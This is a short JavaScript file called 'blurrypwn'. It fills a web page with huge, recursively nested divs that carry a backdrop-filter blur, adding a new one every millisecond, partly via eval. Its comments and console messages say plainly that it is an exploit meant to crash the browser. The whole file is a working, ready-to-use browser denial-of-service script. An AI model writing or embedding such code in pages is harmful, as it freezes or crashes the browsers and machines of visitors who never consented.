var pwn = {
    divI: 0, // How many inherits of the div exists
    logging: true, // Disable the console messages
    loop: null, // Don't touch this, this variable gets used to store the loop and therefore being able to be cleared
    interval:1, // How fast does it create a new div

    // This function starts the div making
    start: function() {
        if (!document.getElementById("pwnStyling")) {
            document.body.innerHTML += "<style id='pwnStyling'>.pwnDiv {backdrop-filter: blur(10px);-webkit-backdrop-filter: blur(10px); width:900000px; height:900000px;}</style>"; // Adds the blur, vevy cool, this make browser go crash
            if (pwn.logging) {
                console.log("%cblurrypwn: started exploit", "color:green")
            }
            pwn.loop = setInterval(pwn.add, pwn.interval); // Starts a loop adding more divs with pwn.add(), and the speed of pwn.interval (default is 1)
        } else {
            if (pwn.logging) {
                console.log("%cblurrypwn: is already active", "color:red")
            }
        }
        
    },

    // Manually add a div
    // Note, the start function uses this function to create divs
    add: function() {
        if (pwn.divI < 1) {
            if (pwn.logging) {
                console.log("%cblurrypwn: added root div", "color:green")
            }
            pwn.divI++; // Increases the numbers of divs that exist in the variable pwn.divI
            document.body.innerHTML += "<div class='pwnDiv' id='" + pwn.divI + "'></div>"; // Makes root div
        } else {
            if (pwn.logging) {
                console.log("%cblurrypwn: added new div", "color:green")
            }
            let morePwn = pwn.divI + 1; // Used so the new div has one integer higher id then the last i.e the last was 1 so pwn.divI is 1 then it makes a div that is one bigger than pwn.divI aka 2 and sets pwn.divI to 2, long story short it works
            eval('document.getElementById("' + pwn.divI + '").innerHTML += "<div class=pwnDiv id=" + morePwn + ">1</div>";') // Makes a div in the last div and so on
            pwn.divI++; // Increases the numbers of divs that exist in the variable pwn.divI
        }
    },

    // Removes the backdrop-filter on the divs
    // Without the backdrop-filter the divs are useless and most 2015 computer's can easily handle having 3000 divs no problemo... But with blur, fuck no
    end: function () {
        if (!document.getElementById("pwnStyling")) {
            if (pwn.logging) {
                console.log("%cblurrypwn: is not active", "color:yellow")
            }
        } else {
            if (pwn.logging) {
                console.log("%cblurrypwn: stopped exploit", "color:green")
            }
            document.getElementById("pwnStyling").remove() // Removes the <style> element with the backdrop-filter
            clearInterval(pwn.loop); // Stops new divs from being made, unless you use pwn.add() or start it again
        }
    }
}